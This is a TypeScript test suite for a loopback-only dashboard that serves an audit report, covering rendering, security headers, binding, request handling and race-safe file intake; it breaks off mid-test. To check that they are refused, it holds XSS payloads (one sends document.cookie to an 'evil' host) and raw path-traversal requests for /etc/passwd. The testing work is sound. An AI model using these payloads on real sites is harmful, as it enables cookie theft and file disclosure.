import { spawn, spawnSync } from 'node:child_process';
import { connect } from 'node:net';
import { appendFileSync, mkdirSync, mkdtempSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  buildOperatorConsole,
  CONSOLE_ARTIFACT_FILENAMES,
  CONSOLE_PHASES,
  type OperatorConsoleReport,
} from '../src/ops/promotion-operator-console.js';
import {
  buildConsoleIntake,
  CONSOLE_INTAKE_MAX_ARTIFACT_BYTES,
  ConsoleIntakeError,
  readBoundedRegularFile,
} from '../src/ops/promotion-operator-console-intake.js';
import {
  buildDashboardManifest,
  buildDashboardStatus,
  DASHBOARD_BOUNDARY,
  renderOperatorDashboardHtml,
} from '../src/ops/promotion-operator-dashboard.js';
import {
  DASHBOARD_CSP,
  DashboardConfigError,
  DashboardStartupError,
  startDashboard,
  validateDashboardConfig,
  type StartedDashboard,
} from '../src/ops/promotion-operator-dashboard-server.js';
import {
  operatorUiRenderHasExternalReference,
  operatorUiRenderHasForbiddenMarkup,
} from '../src/ops/operator-ui-render-allowlist.js';
import { buildOperatorUiStaticRuntimeManifest } from '../src/ops/operator-ui-static-runtime.js';
import {
  buildRealP227AChain,
  buildSyntheticChain,
  PARTICIPANT_DIGESTS,
  PARTICIPANT_TIMESTAMPS,
  REAL_APPROVAL_ID,
  REAL_ITEM_ID,
  type Rec,
  type Reports,
} from './helpers/promotion-chain-kit.js';

let passed = 0;
let failed = 0;
const failures: Array<[string, unknown]> = [];

async function test(name: string, fn: () => void | Promise<void>): Promise<void> {
  try { await fn(); passed++; console.log(`  PASS  ${name}`); }
  catch (err) { failed++; failures.push([name, err]); console.log(`  FAIL  ${name}: ${(err as Error).message}`); }
}
function assert(cond: unknown, msg: string): void { if (!cond) throw new Error(msg); }
function assertEq<T>(actual: T, expected: T, msg: string): void { if (actual !== expected) throw new Error(`${msg}: expected ${String(expected)}, got ${String(actual)}`); }
async function assertRejects(p: Promise<unknown>, kind: new (...a: never[]) => Error, msg: string): Promise<void> {
  try { await p; } catch (err) { assert(err instanceof kind, `${msg}: wrong error ${(err as Error).name}`); return; }
  throw new Error(`${msg}: resolved instead of rejecting`);
}

const projectRoot = fileURLToPath(new URL('..', import.meta.url));
const cliPath = fileURLToPath(new URL('../src/ops/promotion-operator-dashboard-cli.ts', import.meta.url));
const SYNTHETIC_APPROVAL_ID = 'chain-kit-synthetic';
const SYNTHETIC_ITEM_ID = '0a40074065d91a75ad41f33fc212e917';

function workspace(): string { return mkdtempSync(join(tmpdir(), 'DASHMARKER-')); }
function layout(dir: string, reports: Reports): void {
  mkdirSync(dir, { recursive: true });
  for (const phase of CONSOLE_PHASES) {
    const value = reports[String(phase)];
    if (value !== undefined) writeFileSync(join(dir, CONSOLE_ARTIFACT_FILENAMES[phase]![0]!), JSON.stringify(value, null, 2));
  }
}
function consoleFor(reports: Reports): OperatorConsoleReport {
  return buildOperatorConsole({ mode: 'BUNDLE', bundle: reports });
}
async function serve(report: OperatorConsoleReport, port?: number): Promise<StartedDashboard> {
  return startDashboard(report, port === undefined ? {} : { port });
}
async function get(started: StartedDashboard, path: string): Promise<{ status: number; headers: Headers; body: string }> {
  const res = await fetch(`${started.url.replace(/\/$/, '')}${path}`, { redirect: 'manual' });
  return { status: res.status, headers: res.headers, body: await res.text() };
}
// Raw socket: fetch normalises traversal, query and oversized targets away before they reach the server.
function raw(port: number, requestLine: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const socket = connect(port, '127.0.0.1', () => socket.write(`${requestLine}\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n`));
    let out = '';
    socket.setTimeout(10000, () => { socket.destroy(); reject(new Error('raw request timed out')); });
    socket.on('data', (c) => { out += c.toString('utf8'); });
    socket.on('end', () => resolve(out));
    socket.on('error', reject);
  });
}
function statusLine(response: string): number {
  return Number(/^HTTP\/1\.1 (\d{3})/.exec(response)?.[1] ?? 0);
}
// Everything that must never appear in any byte this surface emits.
function assertNoLeak(text: string, where: string): void {
  for (const marker of ['DASHMARKER', '/mnt/', '\\mnt\\', 'catalog-authority-test-library', SYNTHETIC_APPROVAL_ID, SYNTHETIC_ITEM_ID, REAL_ITEM_ID, REAL_APPROVAL_ID, 'phase-231-promotion-execution-authorization.json', 'Chain Kit', 'source.mp4']) {
    assert(!text.includes(marker), `${where}: leaked ${marker}`);
  }
  for (const d of PARTICIPANT_DIGESTS) assert(!text.includes(d), `${where}: leaked a participant identity`);
  for (const t of PARTICIPANT_TIMESTAMPS) assert(!text.includes(t), `${where}: leaked a timestamp`);
}

console.log('Running Phase 243 operator dashboard suite:\n');

// ---------------------------------------------------------------------------------------------------------
// The page itself
// ---------------------------------------------------------------------------------------------------------

await test('the page states the console verdict unchanged, and never invents one of its own', () => {
  const root = workspace();
  try {
    const full = buildSyntheticChain(root);
    const cases: Array<[string, OperatorConsoleReport]> = [
      ['AUDIT_CLOSED', consoleFor(full)],
      ['AUDIT_OPEN', consoleFor(buildRealP227AChain())],
      ['AUDIT_INVALID', consoleFor({ ...full, 235: 'not-a-report' as unknown as Rec })],
      ['NOT_ELIGIBLE', buildOperatorConsole({})],
    ];
    for (const [expected, report] of cases) {
      assertEq(report.overall, expected as OperatorConsoleReport['overall'], `precondition: the console says ${expected}`);
      const html = renderOperatorDashboardHtml(report);
      assert(html.includes(`<h2 id="outcome-h" class="code">${expected}</h2>`), `the page headlines ${expected}`);
      assert(html.includes(`<title>Promotion record chain -- ${expected}</title>`), `the title carries ${expected}`);
      // Every blocker, step and proof limit is reproduced verbatim -- no summarising, no re-wording.
      for (const b of report.blockers) assert(html.includes(b.code) && html.includes(escapeForCompare(b.meaning)), `${expected}: blocker ${b.code} is shown with its meaning`);
      assertEq((html.match(/<li class="blocker">/g) ?? []).length, report.blockers.length, `${expected}: every blocker rendered`);
      // Plain <li> are the steps and disclaimers; blockers carry a class and are counted above.
      assertEq((html.match(/<li>/g) ?? []).length, report.nextSteps.length + report.disclaimers.length,
        `${expected}: every step and disclaimer rendered`);
      assertEq((html.match(/<tr><td>2\d\d<\/td>/g) ?? []).length, report.audit.proofLimits.length, `${expected}: the whole proof-limit matrix travels with the verdict`);
    }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

function escapeForCompare(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

await test('an unfinished chain is presented as normal, never as a fault', () => {
  const report = consoleFor(buildRealP227AChain());
  const html = renderOperatorDashboardHtml(report);
  assert(html.includes('honestly unfinished'), 'the headline says unfinished');
  assert(html.includes('This is normal, not a defect'), 'and that it is normal');
  assert(html.includes('ABSENT is normal'), 'the artifact table says so too');
  assert(html.includes('Phase 232 -- present, but not finished'), 'the outstanding phase is the undecided one, not the next absent');
  // AUDIT_CLOSED appears only where it belongs -- in the disclaimers and the proof-limit matrix, explaining
  // what it would and would not mean. It is never the verdict a reader sees for this chain.
  assert(!html.includes('class="code">AUDIT_CLOSED'), 'never headlined as closed');
  assert(!html.includes('<title>Promotion record chain -- AUDIT_CLOSED'), 'and never titled as closed');
  assert(html.includes('It does NOT mean the promotion happened'), 'while the caveat about it is still carried');
  const status = buildDashboardStatus(report);
  assertEq(status.ok, true, 'an honestly unfinished chain is HEALTHY, not a failure');
  assertEq(status.nextRequiredPhase, 232, 'and the status contract agrees on what is outstanding');
});

await test('the page is accessible and readable on a phone, keyboard and screen reader', () => {
  const root = workspace();
  try {
    const html = renderOperatorDashboardHtml(consoleFor(buildSyntheticChain(root)));
    assert(html.startsWith('<!doctype html>\n<html lang="en">'), 'declared document language');
    assert(html.includes('<meta name="viewport" content="width=device-width, initial-scale=1">'), 'mobile viewport');
    assert(html.includes('<a class="skip" href="#outcome">'), 'skip link to the verdict');
    assert(html.includes(':focus-visible{outline'), 'visible keyboard focus');
    assert(html.includes('@media(max-width:34rem)'), 'a small-screen layout');
    assert(html.includes('prefers-color-scheme:dark'), 'honours the reader\'s colour scheme');
    assertEq((html.match(/<h1>/g) ?? []).length, 1, 'exactly one h1');
    assert((html.match(/<h2 /g) ?? []).length >= 6, 'sectioned under h2s');
    assert((html.match(/aria-labelledby=/g) ?? []).length >= 6, 'every section is named for a screen reader');
    assert(html.includes('<th scope="row">Phase 231</th>') && html.includes('<th scope="col">Phase</th>'), 'table headers are scoped');
    assert((html.match(/<caption>/g) ?? []).length === 2, 'both tables are captioned');
    // Status is never carried by colour alone: the word is always present, and the symbol is decorative.
    assert(html.includes('<td class="mark good" aria-hidden="true">+</td>'), 'the symbol is hidden from assistive tech');
    assert(html.includes('<td>PRESENT</td>'), 'because the word carries the meaning');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// ---------------------------------------------------------------------------------------------------------
// Injection
// ---------------------------------------------------------------------------------------------------------

await test('adversarial: artifacts stuffed with markup and script cannot reach the page', () => {
  const root = workspace();
  try {
    const payloads = [
      '<script>fetch("http://evil/"+document.cookie)</script>',
      '"><img src=x onerror=alert(1)>',
      "javascript:alert('x')",
      '</style><iframe src="https://evil"></iframe>',
      '<form action="https://evil"><input name=a>',
      ' <svg onload=alert(1)>',
    ];
    for (const payload of payloads) {
      const hostile: Reports = { ...buildSyntheticChain(root), 235: { report: payload, injected: payload, [payload]: payload } as unknown as Rec };
      const report = consoleFor(hostile);
      const html = renderOperatorDashboardHtml(report);
      // The console is value-free, so nothing hostile is even available to render -- and the markup gates
      // this surface shares with the Phase 64 allowlist confirm it independently.
      assert(!html.includes(payload), 'the payload never appears literally');
      assert(!/<script/i.test(html) && !/<iframe/i.test(html) && !/<img/i.test(html) && !/<form/i.test(html), 'no injected element survives');
      assert(!/\son[a-z]+\s*=/i.test(html), 'no inline event handler');
      assertEq(operatorUiRenderHasForbiddenMarkup(html), false, 'passes the shared forbidden-markup gate');
      assertEq(operatorUiRenderHasExternalReference(html), false, 'passes the shared external-reference gate');
      assertEq(report.overall, 'AUDIT_INVALID', 'and the hostile artifact is reported as the defect it is');
    }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

await test('adversarial: live, network and location-bearing artifacts fail closed without being echoed', async () => {
  const root = workspace();
  let started: StartedDashboard | undefined;
  try {
    const hostile: Reports = {
      ...buildSyntheticChain(root),
      236: { endpoint: 'https://jellyfin.example.com:8096/emby/Items', host: '10.0.0.9', share: '\\\\tower\\Movies' } as unknown as Rec,
    };
    const report = consoleFor(hostile);
    assertEq(report.overall, 'AUDIT_INVALID', 'live data fails closed');
    assert(report.blockerCodes.includes('CONSOLE_LIVE_DATA_PRESENT'), 'and is named as live data');
    started = await serve(report);
    const page = await get(started, '/');
    const status = await get(started, '/status.json');
    for (const body of [page.body, status.body]) {
      for (const leak of ['jellyfin.example.com', '10.0.0.9', 'tower', '8096', 'emby']) {
        assert(!body.includes(leak), `never echoed: ${leak}`);
      }
    }
    assertEq(status.status, 503, 'an invalid chain is not a healthy one');
  } finally { await started?.close(); rmSync(root, { recursive: true, force: true }); }
});

// ---------------------------------------------------------------------------------------------------------
// Binding, and everything a browser can send
// ---------------------------------------------------------------------------------------------------------

await test('adversarial: it binds to loopback or it does not bind at all', async () => {
  const report = buildOperatorConsole({});
  for (const host of ['0.0.0.0', '::', '::1', 'localhost', '192.168.1.10', '0.0.0.0 ', '127.0.0.2', '']) {
    assertRejectsSync(() => validateDashboardConfig({ host }), `host ${host} is refused`);
    await assertRejects(startDashboard(report, { host } as never), DashboardConfigError, `host ${host} never listens`);
  }
  assertEq(validateDashboardConfig({}).host, '127.0.0.1', 'loopback is the only host');
  assertEq(validateDashboardConfig({}).port, 0, 'and an operating-system-chosen port is the default');
});

function assertRejectsSync(fn: () => unknown, msg: string): void {
  try { fn(); } catch { return; }
  throw new Error(`${msg}: did not throw`);
}

await test('adversarial: ports are bounded, and a port already in use fails safely', async () => {
  const report = buildOperatorConsole({});
  for (const port of [-1, 1, 80, 1023, 65536, 99999, 1.5, Number.NaN]) {
    assertRejectsSync(() => validateDashboardConfig({ port }), `port ${port} is refused`);
    await assertRejects(startDashboard(report, { port }), DashboardConfigError, `port ${port} never listens`);
  }
  const first = await serve(report);
  try {
    assert(first.port >= 1024, 'the operating system chose a real port');
    await assertRejects(startDashboard(report, { port: first.port }), DashboardStartupError, 'a port already in use fails safely');
    assertEq(first.url, `http://127.0.0.1:${first.port}/`, 'and the first server is unharmed');
    assertEq((await get(first, '/healthz')).status, 200, 'and still serving');
  } finally { await first.close(); }
});

await test('adversarial: traversal, absolute-URL, encoded and null-byte targets are all refused', async () => {
  const started = await serve(buildOperatorConsole({}));
  try {
    const hostile = [
      'GET /../../../../etc/passwd HTTP/1.1',
      'GET /..%2f..%2fetc/passwd HTTP/1.1',
      'GET /%2e%2e/%2e%2e/secret HTTP/1.1',
      'GET //evil.example.com/ HTTP/1.1',
      'GET http://evil.example.com/ HTTP/1.1',
      'GET https://evil.example.com/status.json HTTP/1.1',
      'GET /status.json\\..\\..\\etc HTTP/1.1',
      'GET /status.json%00.txt HTTP/1.1',
      'GET /%5c%5cshare HTTP/1.1',
    ];
    for (const line of hostile) {
      const code = statusLine(await raw(started.port, line));
      assertEq(code, 404, `refused: ${line}`);
    }
    // A target with no leading slash never reaches the handler: Node's parser refuses it first. Either way it
    // is an error, never a served route.
    assertEq(statusLine(await raw(started.port, 'GET status.json HTTP/1.1')), 400, 'a relative target is rejected by the parser');
    // No parameter reaches this server at all -- there is no route that takes one.
    for (const line of ['GET /?dir=/etc HTTP/1.1', 'GET /status.json?path=../.. HTTP/1.1', 'GET /#frag HTTP/1.1', 'GET /manifest.json?x=1 HTTP/1.1']) {
      assertEq(statusLine(await raw(started.port, line)), 404, `query or fragment refused: ${line}`);
    }
    // And an oversized target is bounded rather than parsed.
    assertEq(statusLine(await raw(started.port, `GET /${'a'.repeat(4096)} HTTP/1.1`)), 414, 'an oversized request target is bounded');
    // The real routes still work after all of that.
    assertEq((await get(started, '/')).status, 200, 'the page still serves');
  } finally { await started.close(); }
});

await test('adversarial: nothing but GET, and no request body is ever read', async () => {
  const started = await serve(buildOperatorConsole({}));
  try {
    for (const method of ['POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE', 'HEAD']) {
      for (const [path, expected] of [['/', 405], ['/status.json', 405], ['/nope', 404]] as const) {
        const res = await raw(started.port, `${method} ${path} HTTP/1.1`);
        assertEq(statusLine(res), expected, `${method} ${path}`);
        if (expected === 405) assert(/allow: GET/i.test(res), `${method} ${path} advertises GET only`);
      }
    }
    // A body on a GET is drained and ignored, never parsed or acted on.
    const withBody = await new Promise<string>((resolve, reject) => {
      const socket = connect(started.port, '127.0.0.1', () => {
        socket.write('POST /status.json HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 26\r\nConnection: close\r\n\r\n{"mutate":"please-do-this"}');
      });
      let out = '';
      socket.setTimeout(10000, () => { socket.destroy(); reject(new Error('timed out')); });
      socket.on('data', (c) => { out += c.toString('utf8'); });
      socket.on('end', () => resolve(out));
      socket.on('error', reject);
    });
    assertEq(statusLine(withBody), 405, 'a body does not buy a mutation');
    assert(!withBody.includes('please-do-this'), 'and is never reflected');
  } finally { await started.close(); }
});

await test('every response carries the security headers, and nothing is cacheable', async () => {
  const root = workspace();
  const started = await serve(consoleFor(buildSyntheticChain(root)));
  try {
    for (const path of ['/', '/healthz', '/status.json', '/manifest.json', '/nope']) {
      const res = await get(started, path);
      assertEq(res.headers.get('content-security-policy'), DASHBOARD_CSP, `${path}: CSP`);
      assert((res.headers.get('cache-control') ?? '').includes('no-store'), `${path}: no-store`);
      assertEq(res.headers.get('x-content-type-options'), 'nosniff', `${path}: nosniff`);
      assertEq(res.headers.get('referrer-policy'), 'no-referrer', `${path}: no referrer`);
      assertEq(res.headers.get('x-frame-options'), 'DENY', `${path}: not framable`);
      assert((res.headers.get('permissions-policy') ?? '').includes('geolocation=()'), `${path}: permissions policy`);
    }
    assert(DASHBOARD_CSP.includes("script-src 'none'"), 'no script may execute on this page at all');
    assert(DASHBOARD_CSP.includes("connect-src 'none'"), 'and the page can reach nothing');
    assert(DASHBOARD_CSP.includes("form-action 'none'"), 'and submit nowhere');
  } finally { await started.close(); rmSync(root, { recursive: true, force: true }); }
});

await test('the health, status and manifest contracts say what this surface is and is not', async () => {
  const root = workspace();
  const chain = buildSyntheticChain(root);
  const started = await serve(consoleFor(chain));
  try {
    const health = await get(started, '/healthz');
    assertEq(health.status, 200, 'healthz is 200');
    assertEq((JSON.parse(health.body) as { code: string }).code, 'PROMOTION_OPERATOR_DASHBOARD_HEALTHY', 'healthz code');

    const status = await get(started, '/status.json');
    assertEq(status.status, 200, 'a closed chain is healthy');
    const parsed = JSON.parse(status.body) as ReturnType<typeof buildDashboardStatus>;
    assertEq(parsed.overall, 'AUDIT_CLOSED', 'status carries the outcome');
    assertEq(parsed.snapshotTakenAtLaunch, true, 'and says the snapshot is fixed');
    assertEq(parsed.consoleDigest, consoleFor(chain).consoleDigest, 'and ties the page to the exact console report');
    assert(parsed.boundary === DASHBOARD_BOUNDARY, 'the boundary travels in the contract');

    const manifest = JSON.parse((await get(started, '/manifest.json')).body) as ReturnType<typeof buildDashboardManifest>;
    assertEq(manifest.accessBoundary, 'loopback-only', 'loopback only');
    assertEq(manifest.remoteExposure, 'blocked', 'remote exposure blocked');
    assertEq(manifest.clientScript, 'none', 'no client script');
    assertEq(manifest.queryParameters, 'rejected', 'no parameters');
    assertEq(manifest.methods.join(','), 'GET', 'read-only by method');
    assertEq(manifest.routes.join(' '), 'GET / GET /healthz GET /status.json GET /manifest.json', 'the whole route surface is declared');
    for (const boundary of ['no-mutation', 'no-upload', 'no-browser-supplied-path', 'no-filesystem-read-after-launch', 'no-db-read', 'no-outbound-network', 'no-jellyfin-access', 'no-movies-library-access', 'no-phase-231-authorization', 'no-archive-or-delete', 'no-merge-tag-or-push', 'no-audit-semantics-of-its-own']) {
      assert(manifest.boundaries.includes(boundary), `declares ${boundary}`);
    }
  } finally { await started.close(); rmSync(root, { recursive: true, force: true }); }
});

// ---------------------------------------------------------------------------------------------------------
// Intake: symlinks, TOCTOU, size, and the four artifact states
// ---------------------------------------------------------------------------------------------------------

await test('adversarial: a symlink, a directory or an oversized file under an allowlisted name is refused', () => {
  const root = workspace();
  try {
    const chain = buildSyntheticChain(root);
    const outside = join(root, 'outside-the-directory.json');
    writeFileSync(outside, JSON.stringify(chain['235']!));

    const dir = join(root, 'a');
    layout(dir, chain);
    rmSync(join(dir, CONSOLE_ARTIFACT_FILENAMES[235]![0]!));
    // A file symlink needs a privilege Windows does not grant by default; a junction to a directory needs
    // none and exercises the same branch -- lstat sees a link, not a regular file, so it is refused rather
    // than resolved. Either link type proves the artifact outside the named directory is never followed.
    const linkPath = join(dir, CONSOLE_ARTIFACT_FILENAMES[235]![0]!);
    const outsideDir = join(root, 'outside-dir');
    mkdirSync(outsideDir, { recursive: true });
    let symlinked = true;
    try { symlinkSync(outside, linkPath, 'file'); }
    catch {
      try { symlinkSync(outsideDir, linkPath, 'junction'); }
      catch { symlinked = false; console.log('        (symlink case skipped: this host permits no link creation at all)'); }
    }

    if (symlinked) {
      const report = buildOperatorConsole(buildConsoleIntake({ dir }));
      assertEq(report.artifacts.find((a) => a.phase === 235)!.status, 'MALFORMED', 'a symlink is refused, not followed');
      assert(report.blockerCodes.includes('CONSOLE_PHASE_235_ARTIFACT_MALFORMED'), 'and reported as a defect');
      assert(!report.blockerCodes.includes('CONSOLE_PHASE_235_ARTIFACT_DUPLICATE'), 'exactly once');
      assertEq(report.overall, 'AUDIT_INVALID', 'so the chain does not quietly read as complete');
    }

    // A directory wearing an artifact's name is likewise refused rather than read.
    const dirDir = join(root, 'b');
    layout(dirDir, chain);
    rmSync(join(dirDir, CONSOLE_ARTIFACT_FILENAMES[236]![0]!));
    mkdirSync(join(dirDir, CONSOLE_ARTIFACT_FILENAMES[236]![0]!));
    assertEq(buildOperatorConsole(buildConsoleIntake({ dir: dirDir })).artifacts.find((a) => a.phase === 236)!.status,
      'MALFORMED', 'a directory is not an artifact');

    // And a file too large to be an artifact of this chain is never parsed.
    const bigDir = join(root, 'c');
    layout(bigDir, chain);
    writeFileSync(join(bigDir, CONSOLE_ARTIFACT_FILENAMES[237]![0]!), `{"report":"x","pad":"${'p'.repeat(CONSOLE_INTAKE_MAX_ARTIFACT_BYTES + 64)}"}`);
    const big = buildOperatorConsole(buildConsoleIntake({ dir: bigDir }));
    assertEq(big.artifacts.find((a) => a.phase === 237)!.status, 'MALFORMED', 'an oversized artifact is refused');
    assert(!JSON.stringify(big).includes('pppppppppp'), 'and never parsed into anything');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// THE CHECK/USE WINDOW ITSELF. Inspecting a path and then separately opening it is a race: between the two
// the name can be repointed, and the open follows it. A physical race is not reproducible, so these drive the
// window deterministically through the read hook, which fires at exactly the moment a swap would have to
// happen to matter. Every case here passes against a descriptor-anchored read and FAILS against a
// stat-then-readFileSync one, which is the whole point of having them.
await test('adversarial: a name swapped to a symlink inside the check/use window is refused, not followed', () => {
  const root = workspace();
  try {
    const chain = buildSyntheticChain(root);
    const dir = join(root, 'race');
    layout(dir, chain);
    const target = join(dir, CONSOLE_ARTIFACT_FILENAMES[235]![0]!);

    const secretPath = join(root, 'outside-the-intake.json');
    const SECRET = 'artifact-from-outside-the-named-directory';
    writeFileSync(secretPath, JSON.stringify({ report: 'phase-235-promotion-operation-closure-record', smuggled: SECRET }));
    const outsideDir = join(root, 'outside-dir');
    mkdirSync(outsideDir, { recursive: true });

    let linkKind: 'file' | 'junction' | null = null;
    const report = buildOperatorConsole(buildConsoleIntake({ dir }, {
      afterInspect: (path) => {
        if (path !== target || linkKind !== null) return;
        // The file was a genuine, bounded, regular artifact when it was inspected a moment ago.
        rmSync(target);
        try { symlinkSync(secretPath, target, 'file'); linkKind = 'file'; }
        catch {
          try { symlinkSync(outsideDir, target, 'junction'); linkKind = 'junction'; }
          catch { writeFileSync(target, JSON.stringify(chain['235']!)); }
        }
      },
    }));

    if (linkKind === null) { console.log('        (link swap skipped: this host permits no link creation at all)'); return; }
    assertEq(report.artifacts.find((a) => a.phase === 235)!.status, 'MALFORMED',
      `a ${linkKind} link swapped in during the window is refused`);
    assert(report.blockerCodes.includes('CONSOLE_PHASE_235_ARTIFACT_MALFORMED'), 'and reported as a defect');
    assertEq(report.overall, 'AUDIT_INVALID', 'so the chain never reads as complete over a followed link');
    if (linkKind === 'file') {
      assert(!JSON.stringify(report).includes(SECRET), 'and the file outside the intake is never read');
    }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

await test('adversarial: a different file swapped over the name inside the window is refused on every platform', () => {
  const root = workspace();
  try {
    const chain = buildSyntheticChain(root);
    const dir = join(root, 'race');
    layout(dir, chain);
    const target = join(dir, CONSOLE_ARTIFACT_FILENAMES[236]![0]!);

    // A decoy that exists at the same time as the real artifact, so the two objects are distinct beyond any
    // doubt -- no inode reuse, no coincidence. It is a PERFECTLY VALID Phase 236 report: the only thing wrong
    // with it is that it is not the object that was validated.
    const decoy = join(root, 'decoy.json');
    writeFileSync(decoy, JSON.stringify(chain['236']!));
    let swapped = false;

    const report = buildOperatorConsole(buildConsoleIntake({ dir }, {
      afterInspect: (path) => {
        if (path !== target || swapped) return;
        swapped = true;
        renameSync(decoy, target);   // atomic replace: the name now denotes a different object
      },
    }));
    assertEq(swapped, true, 'precondition: the window was actually driven');
    assertEq(report.artifacts.find((a) => a.phase === 236)!.status, 'MALFORMED',
      'the object read must be the object validated, or nothing is read');
    assertEq(report.overall, 'AUDIT_INVALID', 'and the swap fails closed');
    // A stat-then-readFileSync implementation would have parsed the decoy happily and reported PRESENT.
    assert(!report.artifacts.find((a) => a.phase === 236)!.usable, 'the swapped artifact never reaches the audit');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

await test('adversarial: a file that grows inside the window is refused without an unbounded allocation', () => {
  const root = workspace();
  try {
    const chain = buildSyntheticChain(root);
    const dir = join(root, 'race');
    layout(dir, chain);
    const target = join(dir, CONSOLE_ARTIFACT_FILENAMES[237]![0]!);
    const validatedSize = statSync(target).size;
    // Built BEFORE anything is measured, so the only buffer allocated inside the measured window is the
    // reader's own. Appending a Buffer rather than a string keeps the hook itself allocation-free.
    const growth = Buffer.alloc(CONSOLE_INTAKE_MAX_ARTIFACT_BYTES * 4, 0x78);
    let grown = false;

    const before = process.memoryUsage().arrayBuffers;
    const report = buildOperatorConsole(buildConsoleIntake({ dir }, {
      afterInspect: (path) => {
        if (path !== target || grown) return;
        grown = true;
        appendFileSync(target, growth);   // small and bounded when inspected; 4 MiB by the time it is opened
      },
    }));
    const allocated = process.memoryUsage().arrayBuffers - before;

    assertEq(grown, true, 'precondition: the window was actually driven');
    assert(statSync(target).size > CONSOLE_INTAKE_MAX_ARTIFACT_BYTES * 4, 'precondition: the file really did grow past the cap');
    assertEq(report.artifacts.find((a) => a.phase === 237)!.status, 'MALFORMED', 'growth past the validated size is refused');
    assertEq(report.overall, 'AUDIT_INVALID', 'and fails closed');
    assert(!JSON.stringify(report).includes('xxxxxxxxxx'), 'none of the appended bytes reach the report');
    // The read buffer is one byte past the size that was VALIDATED -- a couple of kilobytes -- so a 4 MiB
    // file cannot cost 4 MiB, or even the 1 MiB cap, of buffer.
    assert(allocated < CONSOLE_INTAKE_MAX_ARTIFACT_BYTES,
      `the allocation stays bounded by the validated size (${validatedSize} bytes), not by what the file became: allocated ${allocated}`);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

await test('adversarial: the explicit bundle is anchored to a descriptor exactly as artifacts are', () => {
  const root = workspace();
  try {
    const chain = buildSyntheticChain(root);
    const bundlePath = join(root, 'bundle.json');
    writeFileSync(bundlePath, JSON.stringify({ 231: chain['231']!, 232: chain['232']! }));
    const decoy = join(root, 'decoy-bundle.json');
    writeFileSync(decoy, JSON.stringify(chain));

    // Unswapped, it reads normally.
    const clean = buildOperatorConsole(buildConsoleIntake({ bundle: bundlePath }));
    assertEq(clean.overall, 'AUDIT_OPEN', 'precondition: the real bundle reads');
    assertEq(clean.presentCount, 2, 'as a two-artifact prefix');

    // Swapped inside the window, it is refused rather than read -- and the refusal never names the path.
    let threw: unknown;
    try {
      buildConsoleIntake({ bundle: bundlePath }, { afterInspect: () => { renameSync(decoy, bundlePath); } });
    } catch (err) { threw = err; }
    assert(threw instanceof ConsoleIntakeError, 'a swapped bundle is refused');
    assertEq((threw as ConsoleIntakeError).code, 'CONSOLE_INTAKE_BUNDLE_UNREADABLE', 'with the bundle refusal code');
    assertNoLeak((threw as Error).message, 'bundle refusal message');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

await test('descriptors do not leak: thousands of reads across every refusal branch keep working', () => {
  const root = workspace();
  try {
    const good = join(root, 'good.json');
    writeFileSync(good, JSON.stringify({ report: 'ok' }));
    const dirEntry = join(root, 'a-directory');
    mkdirSync(dirEntry, { recursive: true });
    const missing = join(root, 'not-there.json');
    const oversized = join(root, 'oversized.json');
    writeFileSync(oversized, 'z'.repeat(CONSOLE_INTAKE_MAX_ARTIFACT_BYTES + 1));

    // Every path through the reader, thousands of times. A descriptor left open on any branch exhausts the
    // process long before this finishes; a leak shows up as EMFILE/EBADF rather than a clean refusal.
    for (let i = 0; i < 3000; i++) {
      assertEq(readBoundedRegularFile(good).ok, true, `read ${i} succeeds`);
      assertEq(readBoundedRegularFile(dirEntry).ok, false, `directory ${i} refused`);
      assertEq(readBoundedRegularFile(missing).ok, false, `missing ${i} refused`);
      assertEq(readBoundedRegularFile(oversized).ok, false, `oversized ${i} refused`);
      assertEq(readBoundedRegularFile(good, { afterInspect: () => { renameSync(good, good); } }).ok, true, `hooked ${i} still succeeds`);
    }
    const final = readBoundedRegularFile(good);
    assert(final.ok && JSON.parse(final.text).report === 'ok', 'and the reader is still healthy at the end');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

await test('TOCTOU: what was audited is what is served, whatever happens to the directory afterwards', async () => {
  const root = workspace();
  let started: StartedDashboard | undefined;
  try {
    const chain = buildSyntheticChain(root);
    const dir = join(root, 'live');
    layout(dir, { 231: chain['231']!, 232: chain['232']! });
    const report = buildOperatorConsole(buildConsoleIntake({ dir }));
    assertEq(report.overall, 'AUDIT_OPEN', 'precondition: a two-artifact prefix');
    started = await serve(report);
    const before = await get(started, '/');
    const beforeStatus = JSON.parse((await get(started, '/status.json')).body) as { overall: string; consoleDigest: string };

    // Everything an attacker could do to the directory while the page is open.
    layout(dir, chain);                                                        // add the whole rest of the chain
    writeFileSync(join(dir, CONSOLE_ARTIFACT_FILENAMES[231]![0]!), '{"report":"swapped"}');
    rmSync(join(dir, CONSOLE_ARTIFACT_FILENAMES[232]![0]!));

    const after = await get(started, '/');
    const afterStatus = JSON.parse((await get(started, '/status.json')).body) as { overall: string; consoleDigest: string };
    assertEq(after.body, before.body, 'the served page is byte-identical after the directory changed');
    assertEq(afterStatus.consoleDigest, beforeStatus.consoleDigest, 'and pinned to the same console report');
    assertEq(afterStatus.overall, 'AUDIT_OPEN', 'no later write can change what this process concluded');
    assert(before.body.includes('Snapshot taken when this server started'), 'and the page says so plainly');
  } finally { await started?.close(); rmSync(root, { recursive: true, force: true }); }
});

await test('malformed, duplicate and misfiled artifacts each show as themselves on the page', () => {
  const root = workspace();
  try {
    const chain = buildSyntheticChain(root);
    const dir = join(root, 'mixed');
    layout(dir, chain);
    writeFileSync(join(dir, CONSOLE_ARTIFACT_FILENAMES[234]![0]!), '{ truncated');                              // malformed
    writeFileSync(join(dir, CONSOLE_ARTIFACT_FILENAMES[236]![1]!), JSON.stringify(chain['236']!));              // duplicate
